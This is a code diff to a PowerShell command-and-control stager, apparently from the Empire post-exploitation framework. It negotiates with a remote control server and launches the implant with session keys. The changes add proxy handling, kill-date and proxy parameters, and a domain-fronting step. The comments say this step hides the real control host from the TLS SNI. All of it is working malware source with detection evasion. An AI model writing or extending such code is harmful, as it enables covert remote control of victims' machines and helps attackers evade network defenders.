@@ -101,12 +101,22 @@ function Start-Negotiate {
         $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
         $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
     }
+
+    if ($Script:Proxy) {
+        $wc.Proxy = $Script:Proxy;   
+    }
+
+    
     # the User-Agent always resets for multiple calls...silly
     if ($customHeaders -ne "") {
         $headers = $customHeaders -split ',';
         $headers | ForEach-Object {
             $headerKey = $_.split(':')[0];
             $headerValue = $_.split(':')[1];
+	    #If host header defined, assume domain fronting is in use and add a call to the base URL first
+	    #this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
+	    if ($headerKey -eq "host"){
+                try{$ig=$WC.DownloadData($s)}catch{}};
             $wc.Headers.Add($headerKey, $headerValue);
         }
     }
@@ -192,6 +202,10 @@ function Start-Negotiate {
         $headers | ForEach-Object {
             $headerKey = $_.split(':')[0];
             $headerValue = $_.split(':')[1];
+	    #If host header defined, assume domain fronting is in use and add a call to the base URL first
+	    #this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
+	    if ($headerKey -eq "host"){
+                try{$ig=$WC.DownloadData($s)}catch{}};
             $wc.Headers.Add($headerKey, $headerValue);
         }
     }
@@ -210,7 +224,7 @@ function Start-Negotiate {
     [GC]::Collect();
 
     # TODO: remove this shitty $server logic
-    Invoke-Empire -Servers @(($s -split "/")[0..2] -join "/") -StagingKey $SK -SessionKey $key -SessionID $ID -WorkingHours "WORKING_HOURS_REPLACE";
+    Invoke-Empire -Servers @(($s -split "/")[0..2] -join "/") -StagingKey $SK -SessionKey $key -SessionID $ID -WorkingHours "WORKING_HOURS_REPLACE" -KillDate "REPLACE_KILLDATE" -ProxySettings $Script:Proxy;
 }
 # $ser is the server populated from the launcher code, needed here in order to facilitate hop listeners
 Start-Negotiate -s "$ser" -SK 'REPLACE_STAGING_KEY' -UA $u;
